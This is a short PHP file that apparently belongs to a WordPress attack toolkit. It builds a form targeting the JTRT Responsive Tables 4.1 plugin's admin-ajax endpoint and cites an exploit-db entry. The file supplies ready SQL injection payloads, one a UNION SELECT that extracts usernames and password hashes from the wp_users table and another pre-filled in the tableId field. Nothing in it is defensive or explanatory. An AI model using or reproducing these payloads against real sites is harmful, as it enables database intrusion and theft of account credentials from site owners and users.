<?php
echo "<h3>WordPress Plugin JTRT Responsive Tables 4.1 - SQL Injection <span style=\"color:red;\">(auth needed)</span></h3>";
echo "<a href=\"https://www.exploit-db.com/exploits/43110/\">https://www.exploit-db.com/exploits/43110/</a>";
echo "<p> You can try \"1 UNION SELECT 1,2,CONCAT(user_login,char(58),user_pass),4,5 FROM wp_users WHERE ID=1\"</p>";
echo "<form class=\"wp-form\" method=\"post\" action=\"http://".$url."/wp-admin/admin-ajax.php?action=get_old_table\">";
echo " <p>tableId  <input type=\"text\" size=\"50\" name=\"tableId\" value=\"1 UNION ALL SELECT NULL,NULL,CONCAT(0x7171707871,0x6a4155714f577a6a4673667856416d476e487777754842625a6656424a6d6a7478594767466f6865,0x716a787071),NULL,NULL-- rSYt\"></p>&nbsp;";
echo " <p><input type=\"submit\" name=\"\"></p>";
echo "</form>";
 ?>
